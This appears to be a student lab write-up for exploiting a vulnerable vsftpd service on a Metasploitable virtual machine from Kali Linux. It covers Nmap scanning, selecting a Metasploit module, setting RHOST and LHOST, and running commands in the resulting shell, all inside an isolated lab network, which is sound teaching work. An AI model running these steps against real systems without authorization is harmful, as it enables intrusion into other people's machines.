# Experiment 2: Simulated Ethical Hacking with Metasploit

## Objective

To perform a safe exploitation on a virtual machine using **Metasploit** to understand ethical hacking procedures.

## Procedure

### Step 1: Configure the Kali Linux and Metasploitable machines

Open the **Kali Linux** virtual machine as the attacker machine and the **Metasploitable** virtual machine as the target machine. Configure both virtual machines to use a **Host-only Adapter** so that they can communicate within the isolated lab network.

![Step 1 Screenshot](images/step_1.jpg)

### Step 2: Verify IP addresses and network connectivity

Use `ifconfig` on both Kali Linux and Metasploitable to identify their IP addresses. From Kali Linux, ping the Metasploitable IP address to verify successful communication between the two machines.
```bash
ifconfig
ping <Metasploitable-IP>
```

![Step 2 Screenshot](images/step_2.jpg)

### Step 3: Scan the target using Nmap

Perform a TCP SYN scan with service and OS detection from Kali Linux against the Metasploitable IP address. The scan identifies open ports, running services, and the probable operating system of the target.
```bash
nmap -sS -sV -O <Metasploitable-IP>
```

![Step 3 Screenshot](images/step_3.jpg)

### Step 4: Search for the vulnerable FTP service in Metasploit

Start the Metasploit Framework using `msfconsole` and search for modules related to **vsftpd**. From the search results, select the appropriate exploit module for the vulnerable FTP service and load the module.
```bash
msfconsole
search vsftpd
use <exploit-module>
```

![Step 4 Screenshot](images/step_4.jpg)

### Step 5: Configure the exploit module

Configure the exploit with the IP address of the Metasploitable target as **RHOST** and the IP address of Kali Linux as **LHOST**.
```bash
set RHOST <Metasploitable-IP>
set LHOST <Kali-IP>
```

![Step 5 Screenshot](images/step_5.jpg)

### Step 6: Execute the exploit and verify access

Execute the configured exploit using `exploit` or `run`. After obtaining a shell on the target, verify the access and execute basic Linux commands such as `whoami`, `getuid`, `sysinfo`, and create a directory to demonstrate interaction with the target system.
```bashbash
exploit
whoami
getuid
sysinfo
mkdir <your-name>
```

![Step 6 Screenshot](images/step_6.jpg)

## Result

The experiment successfully demonstrated ethical exploitation of the Metasploitable system using **Metasploit** and verified access through basic Linux commands.
